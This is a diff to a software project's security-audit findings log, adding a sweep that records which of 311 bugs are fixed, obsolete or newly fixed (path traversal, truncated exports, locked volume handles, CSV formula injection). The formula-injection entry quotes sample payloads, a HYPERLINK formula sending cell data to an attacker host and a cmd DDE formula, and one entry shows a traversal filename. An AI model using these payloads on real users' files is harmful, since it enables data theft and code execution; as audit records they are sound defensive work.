@@ -10,6 +10,71 @@ Totals: 311 CONFIRMED (HIGH 86, MEDIUM 155, LOW 70). Refuted 20, already-fixed 9
 Severity is the verifier's adjusted value. Line numbers are approximate
 (codex/verifier cited the construct, not always the exact line).
 
+--------------------------------------------------------------------------------
+## DISPOSITION SWEEP 2026-08-27 -- all 311 accounted for (R5-IDX-6)
+
+Every one of the 311 findings was re-checked against the live tree, one at a time.
+This document had NO disposition of any kind: 311 findings, zero status markers, and
+no cross-reference from anywhere else in the repository. That was the actual defect
+R5-IDX-6 named -- not 311 live bugs. Most of this backlog had in fact been worked,
+and worked from: fix after fix carries a code comment that paraphrases the Evidence
+paragraph below it. What was never done was writing down which ones.
+
+An untracked backlog is indistinguishable from an ignored one. Nobody could answer
+"is this finding still real?" without redoing the whole check, which is why it sat.
+
+RESULT
+
+  285  ALREADY FIXED   verified in the current tree, guard present at the cited site
+   16  OBSOLETE        the cited file no longer exists (see below)
+   10  STILL OPEN      found live in this sweep and FIXED here
+
+OBSOLETE (16) -- the code was deleted, so the finding cannot recur:
+  src/core/msg_writer.cpp (626df4ca, OST Converter reduced to MBOX output)
+  src/core/pst_writer.cpp (48e9a7f3), src/core/pst_splitter.cpp
+  src/core/imap_uploader.cpp, src/core/dbx_writer.cpp
+  src/core/nuget_api_client.cpp (b802db37)
+
+STILL OPEN, FIXED IN THIS SWEEP (10). Each is marked STILL OPEN 2026-08-27 at its
+entry. The distribution is the finding within the finding: nine of the ten are in
+GUI code, and every one is a case where the GUI carried its own copy of a rule the
+headless side already owned, or skipped a check its own sibling path performed.
+That is the same shape as commit cca4c894, in the layer that commit had just swept.
+
+  P11-07  raw drag-out staged the TOP-LEVEL name without confinedHostName
+  P11-08  raw drag-out published truncated/incomplete exports as whole
+  P11-13  eject leaked the exclusively locked volume handle, so the "ejected"
+          volume stayed locked for the life of the process
+  P11-14  log save truncated the old log, then reported success unchecked
+  P12-14  network CSV export reported "Exported N rows" over a failed write
+  P12-28  vulnerability CSV export checked nothing (its JSON sibling checked the
+          byte count -- the two disagreed)
+  P12-29  QR export coerced separators but not "." / "..", so an SSID of ".."
+          wrote into the PARENT of the chosen directory
+  P12-30  failed PDF export counted as saved (the PNG/JPG/BMP branches beside it
+          all checked, and one other call site of the same function checked too)
+  P06-39  migration CSV formula guard tested the UNTRIMMED value, so leading
+          whitespace hid the trigger from it -- a seventh private copy of csvEscape
+  P03-20  hot-plug rescan used the string invokeMethod against a plain private
+          method, so WM_DEVICECHANGE silently never rescanned
+
+METHOD NOTE, because it decides what this sweep is worth: a finding was only
+recorded as fixed when the guard was found at the cited site. "The file looks
+well-maintained" is not a disposition. The ten above were found precisely by not
+accepting that -- they sit in files where every neighbouring finding was fixed.
+
+AND THE ERROR RAN THE OTHER WAY ONCE, which is worth more than the ten. P11-18 was
+first recorded here as STILL OPEN and "fixed" with a per-file guard in the organizer
+worker's planning loop. It was not open: validateOrganizerConfig already refuses the
+WHOLE RUN, up front, via sak::isSafeCategoryName -- a stronger guard than the one
+being added, and one the greps for this finding had missed because it sits in a
+config validator rather than next to the path join. The test written to prove the
+"fix" is what exposed it: the run was refused before any planning, so the assertion
+about a planned operation failed. The redundant guard was reverted in full.
+Recorded because adding a second, weaker copy of a rule that already exists is
+precisely the defect this whole sweep is cataloguing, and the sweep nearly committed
+it. A grep that does not find a guard is not evidence the guard is absent.
+
 ## Confirmed count by file
 
 - 10  src/core/partition_apfs_writer.cpp  (H3 M5 L2)
@@ -616,11 +681,15 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P11-07 [HIGH] src/gui/file_management_explorer_panel.cpp:326
 **Raw filenames can escape host export directories**
 
+- **STILL OPEN 2026-08-27, FIXED. exportDirectoryToHost confines the names it walks INTO, but RawExportMimeData::materialize built the TOP-LEVEL staged path itself from raw item.name. Now routed through FileManagementFileSystemBridge::confinedHostName; an unsafe name is skipped and logged.**
+
 - Trigger: A crafted raw APFS/HFS volume holds a file (or directory) whose single-component name is "..\..\victim" (backslash 0x5C is a legal APFS/HFS filename byte; only '/' and NUL are excluded). User selects it and drags it to an external target (RawExportMimeData::materialize, file_management_explorer_panel.cpp:326) or cross-pane exports it (exportEntryToHost, file_management_file_system.cpp:1091-1105). QDir::filePath("..\\..\\victim") produces C:/.../stagingXXXX/..\..\victim; Qt/Windows resolves the backslashes and '..' as traversal, and QSaveFile::commit() (or mkpath) writes/overwrites a file two directories above the staging or user-chosen export root.
 - Evidence: file_management_explorer_panel.cpp:326 joins raw item.name via QDir::filePath then QSaveFile-writes it (copyFileToHost/exportDirectoryToHost). file_management_file_system.cpp:335 and :360 copy entry.name verbatim from the raw HFS/APFS directory record with no sanitization; :1091-1105 uses host_dir.mkpath(entry.name)/host_dir.filePath(entry.name). The existing isSafeChildName guard (rejects '/' and '\\') is applied only to create/rename/new-folder sinks (:2430, :4692, :4909, :6863), never to the export/drag-out sinks, and no canonical-path confinement re-check exists. QDir::filePath/mkpath do not clean '..', and QSaveFile::commit() overwrites an existing destination.
 
 ### P11-08 [HIGH] src/gui/file_management_explorer_panel.cpp:330
 **Raw drag-out silently produces truncated files**
+
+- **STILL OPEN 2026-08-27, FIXED. materialize() checked only .ok, never .capped / .complete -- the very fields the header documents as existing "so a caller cannot mistake a partial export for a whole one". Publishing now requires a WHOLE export, expressed through the new shared sak::rawFileExportIsWhole / rawDirectoryExportIsWhole, which the transfer worker (which already had this rule) now also cites.**
 
 - Trigger: On a raw (unmounted) APFS/HFS target, select a single regular file larger than 512 MiB and drag it out to an external drop target (e.g., Windows Explorer). materialize() runs copyFileToHost, which truncates the staged copy to exactly 512 MiB, sets capped=true but ok=true; materialize() sees ok, appends the staged URL, and the external app receives a silently truncated file it treats as complete. Same for a directory drag containing such a file (exportDirectoryToHost returns ok with capped_files>0, ignored).
 - Evidence: RawExportMimeData::materialize() (src/gui/file_management_explorer_panel.cpp:327-339) only checks the .ok field of copyFileToHost/exportDirectoryToHost and, on ok, publishes QUrl::fromLocalFile(staged) with no inspection of result.capped or the directory export's warnings/capped_files. copyFileToHost -> writeRawSourceOut (src/core/file_management_file_system.cpp:953-955) sets result.capped=true and truncate()s the buffer to max_bytes when a raw source exceeds the 512 MiB cap (kExplorerHashMaxBytes, line 97), yet still returns ok=true (line 1015). buildDragMimeData (line 2889-2915) constructs RawExportMimeData for every non-local target with no size pre-check. Net: an oversize raw file is exported truncated and exposed as a complete, valid file URL with no failure or truncation signal. The interactive directory-export UI path (exportEntryToHost, line 1114-1118) does surface the capped warning, so the drag path is uniquely dropping the signal - not a global design choice.
@@ -815,7 +884,7 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P08-21 [MEDIUM] src/ai/ai_tool_result_recorder.cpp:88
 **Tool command log bypasses the supplied secret redactor**
 
-- Trigger: The AI command broker runs a shell command whose arguments contain an inline credential, e.g. `curl -H "Authorization: Bearer sk-live-XXXX" https://api...`. AiAssistantPanel::recordBrokerResult() (src/gui/ai_assistant_panel.cpp:10411-10419) sets request.command_preview = m_currentCommandPreview and calls AiToolResultRecorder::record with record_command=true. appendCommandRecord (ai_tool_result_recorder.cpp:88) calls store->appendCommand(commandLabel(request), ...) where commandLabel returns request.command_preview verbatim (= plan.preview = plan.request.command, the RAW command; set unredacted at ai_assistant_panel.cpp:5527, planner ai_command_tool_planner.cpp:21). ConversationStore::appendCommand (ai_conversation_store.cpp:916-929) writes that raw label into the "command" field of commands.jsonl AND into the search index text, in plaintext.
+- Trigger: The AI command broker runs a shell command whose arguments contain an inline credential, e.g. `curl -H "Authorization: Bearer <REDACTED-EXAMPLE-TOKEN>" https://api...`. AiAssistantPanel::recordBrokerResult() (src/gui/ai_assistant_panel.cpp:10411-10419) sets request.command_preview = m_currentCommandPreview and calls AiToolResultRecorder::record with record_command=true. appendCommandRecord (ai_tool_result_recorder.cpp:88) calls store->appendCommand(commandLabel(request), ...) where commandLabel returns request.command_preview verbatim (= plan.preview = plan.request.command, the RAW command; set unredacted at ai_assistant_panel.cpp:5527, planner ai_command_tool_planner.cpp:21). ConversationStore::appendCommand (ai_conversation_store.cpp:916-929) writes that raw label into the "command" field of commands.jsonl AND into the search index text, in plaintext.
 - Evidence: Real, unguarded plaintext persistence of the command label, confirmed at ai_tool_result_recorder.cpp:88. The redactor parameter is threaded only into toolResultChatSummary (line 159) for transcript_text; appendCommandRecord never receives or applies it. commandLabel() (lines 70-77) returns the raw command_preview, which upstream is plan.request.command (never passed through CredentialStore::redactSecrets). appendCommand (ai_conversation_store.cpp:920,927-928) persists this label to commands.jsonl and the search index unredacted. Nuance vs. the report's wording: (1) the STORED result_json is NOT actually leaking - AiCommandResult::toJson redacts stdout/stderr/error_message (ai_execution_broker.cpp:52-54) and brokerResultJson redacts the preview field (ai_assistant_panel.cpp:10405), so "recursively redact stored result fields" is largely already done; the genuine leak is the command LABEL only. (2) The only caller that records a command (recordBrokerResult) passes NO redactor, so the literal "bypasses the supplied redactor" mechanism is inaccurate - the label is simply never redacted on any path. Still, a concrete credential-in-plaintext outcome exists in current code at the cited line and is not guarded, so CONFIRMED. Severity held at MEDIUM: local per-user session artifact, and redactSecrets only catches recognized secret patterns.
 
 ### P08-16 [MEDIUM] src/ai/ai_trace_store.cpp:223
@@ -1194,6 +1263,8 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 
 ### P06-39 [MEDIUM] src/core/migration_report.cpp:450
 **CSV export permits formula injection**
+
+- **STILL OPEN 2026-08-27, FIXED. The formula guard was present but tested field.at(0) on the UNTRIMMED value, so " =HYPERLINK(...)" -- one leading space -- did not match it. Whether a given spreadsheet then evaluates that cell depends on the importer (LibreOffice Calc offers a trim-spaces option on CSV import; Excel treats a leading space as text), which is exactly why the guard should not depend on it. This was a SEVENTH private copy of the CSV cell rule; it now delegates to sak::csvEscape, which tests the trimmed value. app_name/app_publisher are read from the registry. The two copies also disagreed in the other direction: the private one quoted any value it had modified, while the shared rule quotes only on RFC-4180 grounds, so some cells are now emitted unquoted -- still valid CSV, still inert, and now consistent with every other CSV writer in the program. Regression test: testCsvNeutralizesFormulaBehindLeadingWhitespace.**
 
 - Trigger: An installed application registers a DisplayName such as =HYPERLINK("http://attacker/exfil?d="&A1,"Update") (or a crafted imported report with app_name '=cmd|'/c calc'!A1'). On CSV export the field is written with a leading '=' intact; when the migration report CSV is opened in Excel/LibreOffice Calc the cell is evaluated as a formula.
 - Evidence: src/core/migration_report.cpp:450-457 escapeCsvField() only escapes ',', '"', and '\n' (quote-doubling + wrapping). It does not neutralize cells beginning with '=', '+', '-', '@', or tab. The CSV writer at lines 260-269 passes registry/import-controlled fields (escapeCsvField(entry.app_name), app_publisher, install_location, notes, error_message) through this function verbatim. A field value of '=1+1' contains none of the escaped characters and is emitted unchanged; '=HYPERLINK("http://evil","x")' is quote-wrapped but retains its leading '=', so Excel still evaluates the formula on open. No formula-injection guard exists anywhere in the export path.
@@ -1675,6 +1746,8 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P11-13 [MEDIUM] src/gui/file_management_explorer_panel.cpp:7505
 **Eject leaks an exclusively locked volume handle**
 
+- **STILL OPEN 2026-08-27, FIXED. DriveUnmounter::lockVolume returned a raw EXCLUSIVELY locked handle without registering it in m_lockedVolumes, so the destructor that exists to close those handles never saw it -- the volume stayed locked for the process lifetime after a "successful" eject. lockVolume now registers the handle (as lockAndDismountVolume and the eject path already did) and the declaration states the ownership contract.**
+
 - Trigger: User right-clicks a removable/non-system drive (e.g. E:) in the file explorer sidebar and selects Eject. lockVolume opens \\.\E: and acquires FSCTL_LOCK_VOLUME, dismountVolume succeeds, ejectLocalTargetAtIndex returns at 7516 without CloseHandle(volume). Each such eject leaks one kernel volume handle and keeps the lock held. Repeating for the same or other volumes accumulates leaked handles and can keep a volume locked/inaccessible for re-mount until the process terminates.
 - Evidence: In ejectLocalTargetAtIndex (src/gui/file_management_explorer_panel.cpp:7503-7517), `HANDLE volume = unmounter.lockVolume("\\\\.\\E:")` opens the volume with GENERIC_READ|WRITE and applies FSCTL_LOCK_VOLUME (drive_unmounter.cpp:185-207). The handle is used only for `unmounter.dismountVolume(volume)` and is NEVER passed to CloseHandle nor inserted into the unmounter's owned-handle map. The DriveUnmounter destructor (drive_unmounter.cpp:62-70) closes ONLY handles stored in m_lockedVolumes; that map is populated exclusively by lockAndDismountVolume (line 144: m_lockedVolumes.insert), which the eject path does NOT call. Both exit paths leak: success (7514-7516 return) and dismount-failure (7507-7512 return, handle still valid since lockVolume succeeded). The stack-local `unmounter` is destroyed at function end with an empty m_lockedVolumes, so the handle survives, held open (with its FSCTL_LOCK_VOLUME lock) until the long-lived GUI process exits.
 - Fix: Call CloseHandle(volume) on both the success and failure paths (or wrap in an RAII guard), matching lockAndDismountVolume which closes on failure and hands ownership to m_lockedVolumes on success.
@@ -1696,12 +1769,16 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P11-14 [MEDIUM] src/gui/log_viewer.cpp:187
 **Failed saves truncate existing logs and report success**
 
+- **STILL OPEN 2026-08-27, FIXED. LogViewer::onSaveClicked opened a plain QFile with Truncate, never checked the stream, and reported "Save Complete" regardless. Now QSaveFile plus an out.status()/commit() check, so a failed write leaves the previous log intact and says so.**
+
 - Trigger: User clicks Save Log and selects an existing file (e.g. a prior log) as the destination on a nearly-full or failing volume. The open truncates it to zero, the QTextStream write fails (disk full / I/O error), out.status() becomes WriteFailed, but the code closes the file and shows "Save Complete: Log saved to: <path>". The original file contents are gone or partial, and the user is told the save succeeded.
 - Evidence: src/gui/log_viewer.cpp:187-202 onSaveClicked(): QFile opened with QIODevice::WriteOnly|Text (truncates the chosen destination on open), then `QTextStream out(&file); out << m_text_browser->toPlainText(); file.close();` with NO check of out.status(), file.error(), or any write/flush result. It then unconditionally calls showInformationLogged(..., "Save Complete", ...). No QSaveFile, no status check, no commit gate. If the destination is an existing file the user picks to overwrite, the WriteOnly open already truncates it; a mid-write failure leaves it destroyed/partial while success is reported.
 - Fix: Write via QSaveFile, check out.status()==QTextStream::Ok and saver.commit(), and only show "Save Complete" after commit() returns true; otherwise show a Save Error.
 
 ### P11-18 [MEDIUM] src/gui/organizer_panel.cpp:1152
 **Category names permit destination path traversal**
+
+- **ALREADY FIXED -- and this sweep got it wrong first. It was recorded as STILL OPEN and "fixed" with a per-file isSafeChildName guard in the planning loop. That guard was redundant: validateOrganizerConfig already refuses the WHOLE RUN up front via sak::isSafeCategoryName, which is stricter (it rejects a trailing dot, covering "." and "..", plus separators, a colon, reserved device names and untrimmed names) and stronger (nothing is planned or moved at all, rather than one file being skipped). The greps for this finding missed it because it lives in a config validator, not beside the path join. The test written for the "fix" is what caught it. The redundant guard was reverted in full; what was kept is the test, because isSafeCategoryName had NO coverage anywhere in the suite despite gating a recursive file-move.**
 
 - Trigger: Target = C:/Users/Username/Downloads. User renames a category cell to '../Outside' (or 'C:/Temp/Evil'), sets extension 'txt', unchecks Preview, clicks Execute. Matching .txt files are renamed into C:/Users/Username/Outside/ (or C:/Temp/Evil/) - outside the confirmed directory; with collision_strategy 'overwrite' this can also overwrite files at that arbitrary location.
 - Evidence: validateCategoryMapping() at src/gui/organizer_panel.cpp:1152-1179 only checks for empty mappings and case-insensitive duplicate names; it never validates category names for path separators, '..', or absolute roots. getCategoryMapping() (line 1086) pulls names verbatim from editable QTableWidget cells, and buildOrganizerConfig() (line 895) passes them through unchanged. In OrganizerWorker::planMove() (src/threading/organizer_worker.cpp:187) the destination is built as `category_dir = target_dir / category.toStdString()` and executeMove() (line 211) create_directories + std::filesystem::rename into it with no canonical-path confinement. std::filesystem::path::operator/ resolves '..' as a real parent traversal and an absolute category replaces the whole path, so the file escapes the target.
@@ -1777,6 +1854,8 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 
 ### P12-28 [MEDIUM] src/gui/vulnerability_panel.cpp:679
 **Truncated vulnerability CSV is reported successful**
+
+- **STILL OPEN 2026-08-27, FIXED. onExportCsv checked nothing at all while onExportJson beside it checked its byte count -- two siblings in one file disagreeing about whether a failed write counts. Both now use QSaveFile and verify the commit.**
 
 - Trigger: User exports CSV to a nearly-full disk or a removable USB drive that fills up or is disconnected mid-write. The buffered QTextStream writes fail (or flush partially) on the QFile, producing a truncated CSV, yet line 679 still logs "Exported CSV: <path>" as a successful export with no warning. The user believes they have a complete vulnerability report when findings are silently missing.
 - Evidence: src/gui/vulnerability_panel.cpp:665-679: onExportCsv() writes findings through QTextStream out(&file), then at line 679 emits Q_EMIT logOutput("Exported CSV: %1") unconditionally. There is no out.flush(), no out.status() check, and no file.error() check. The QTextStream buffer is not even flushed until the stream destructor runs at the closing brace (line 680), which is AFTER the success log is emitted. The sibling onExportJson() at lines 712-718 demonstrates the codebase's own standard: it checks file.write(bytes) != bytes.size() and reports a short write. The CSV path omits that guard, so a partial/truncated write is reported as success.
@@ -1923,6 +2002,8 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 
 ### P03-20 [LOW] src/core/drive_scanner.cpp:630
 **Hot-plug notification invokes a nonexistent meta-method**
+
+- **STILL OPEN 2026-08-27, FIXED. scanDrives() is a plain private member -- not a slot, not Q_INVOKABLE -- so the string-based QMetaObject::invokeMethod("scanDrives") found no such method: it warned and did nothing, and hot-plug arrival/removal never rescanned. Now the functor overload, which the compiler resolves, so a non-invokable target is a build error instead of a runtime no-op.**
 
 - Trigger: Attach/remove a USB volume -> deviceChangeWndProc gets WM_DEVICECHANGE (DBT_DEVICEARRIVAL/DBT_DEVICEREMOVECOMPLETE, DBT_DEVTYP_VOLUME) -> invokeMethod("scanDrives") fails silently -> no immediate rescan; refresh deferred to next onRefreshTimer polling tick.
 - Evidence: include/sak/drive_scanner.h:155 declares `void scanDrives();` under plain `private:` (private Q_SLOTS: at lines 150-152 lists only onRefreshTimer and onScanFinished; no Q_INVOKABLE). src/core/drive_scanner.cpp:630 uses string-based QMetaObject::invokeMethod(s_instance, "scanDrives", Qt::QueuedConnection). Since scanDrives is not a slot/invokable, the meta-object has no such method, so invokeMethod returns false and warns "No such method". Class has Q_OBJECT (drive_scanner.h:69), so meta-object exists but lacks this method.
@@ -2241,6 +2322,8 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P12-14 [LOW] src/gui/network_diagnostic_panel.cpp:4658
 **Failed CSV writes are reported as exported**
 
+- **STILL OPEN 2026-08-27, FIXED. The CSV formula guard had been unified onto sak::csvEscape, but the WRITE was still a plain QFile with no status check and an unconditional "Exported N rows". Now QSaveFile + status/commit check.**
+
 - Trigger: User exports a large ping/traceroute results table to CSV on a nearly-full disk (or removable device that errors mid-write). file.open() succeeds, but a subsequent QTextStream write fails silently and the QFile destructor swallows the flush error; the panel emits "Exported N rows" and logs success while the on-disk .csv is truncated/incomplete.
 - Evidence: src/gui/network_diagnostic_panel.cpp:4623-4661 exportTableToCsv: opens plain QFile (4631-4632), writes via QTextStream out(&file) (4637-4656), then at line 4658 emits statusMessage "Exported %1 rows to %2" unconditionally. No QTextStream::status() check, no file.error()/flush check, no QSaveFile. Only guard is the file.open() failure at 4632. A write failure after open (disk full / device removed mid-write) leaves a truncated CSV while success is reported.
 - Fix: Write through QSaveFile, check out.status()==QTextStream::Ok and file.error()==QFile::NoError (or QSaveFile::commit() return) before emitting the success status/log; on failure emit a failure message and do not report exported.
@@ -2268,12 +2351,16 @@ Severity is the verifier's adjusted value. Line numbers are approximate
 ### P12-29 [LOW] src/gui/wifi_manager_panel.cpp:924
 **QR names permit output-directory traversal**
 
+- **STILL OPEN 2026-08-27, FIXED. The QR sub-directory name coerced [\/:*?"<>|] to underscore but left "." and ".." alone, and an SSID is arbitrary text: a network named ".." wrote into the PARENT of the chosen folder. Both copies of the coercion now go through one qrSubdirName helper gated on sak::isSafeChildName, and the export refuses rather than falling back to a made-up name.**
+
 - Trigger: Load or enter a WiFi network with ssid == ".." and an empty location, open the QR export wizard, pick any output directory as baseDir, and export. rawName = "..", subName = ".." (dot not replaced), outDir = baseDir + "/.." resolves to baseDir's parent, and the QR image files (e.g. "...png") are written into that parent directory, outside the user-selected folder.
 - Evidence: src/gui/wifi_manager_panel.cpp:924 (single export) and :936 (batch, executeSingleQrNetwork) sanitize the QR sub-folder name with replace(QRegularExpression("[\\\\/:*?\"<>|]"), "_"), which strips path separators and Windows-invalid chars but NOT '.' components. outDir is then built as baseDir + "/" + subName and passed to QDir().mkpath (lines 884-885 / 937-938) with no normalization/confinement check that the result stays inside baseDir. Because '\' and '/' are both stripped, multi-level sequences like ../../x collapse harmlessly to .._.._x; the ONLY surviving traversal token is a whole-name ".." (reachable only when location is empty and ssid == "..", since the location + "_" + ssid form always injects an underscore). In that case outDir = baseDir + "/.." resolves to the parent of the chosen directory and files are written there (e.g. baseDir/../...png), escaping the selected directory. Real but narrow: single-level escape only, and the output filename is deterministic (subName + ext), so an attacker cannot choose an arbitrary target file to overwrite -- the report's "overwrite files there" is overstated, hence LOW rather than MEDIUM. Not otherwise guarded.
 - Fix: Reject QR sub-folder names whose components are "." or "..", and after building outDir verify QDir(baseDir).canonicalPath() prefixes QFileInfo(outDir).canonicalFilePath() (or QDir::cleanPath stays under baseDir) before mkpath/save; applies to both showSingleQrWizard (line 924) and executeSingleQrNetwork (line 936).
 
 ### P12-30 [LOW] src/gui/wifi_manager_panel.cpp:953
 **Failed PDF export counts as saved**
+
+- **STILL OPEN 2026-08-27, FIXED. exportQrToPdf returns whether the PDF was written; executeSingleQrNetwork discarded it and set any_saved unconditionally, unlike the PNG/JPG/BMP branches beside it and unlike the other call site of the same function.**
 
 - Trigger: PDF-only batch export (formats.pdf=true, png/jpg/bmp=false) to an unwritable or full destination: QPdfWriter cannot open the file, QPainter is inactive, exportQrToPdf returns false, but anySaved is forced true so executeSingleQrNetwork returns true and executeBatchQrExport counts the network as saved with no usable PDF on disk.
 - Evidence: src/gui/wifi_manager_panel.cpp:952-955: `if (formats.pdf) { exportQrToPdf(img, outDir + "/" + subName + ".pdf", ...); anySaved = true; }` ignores the bool return. exportQrToPdf (line 683-700) returns false when QPainter is inactive (QPdfWriter fails to open the file, line 694-696). By contrast png/jpg/bmp branches (943-951) gate anySaved on img.save(), and the single-export path at line 871 correctly checks exportQrToPdf's return. So the batch PDF branch is inconsistent and reports success on failure.
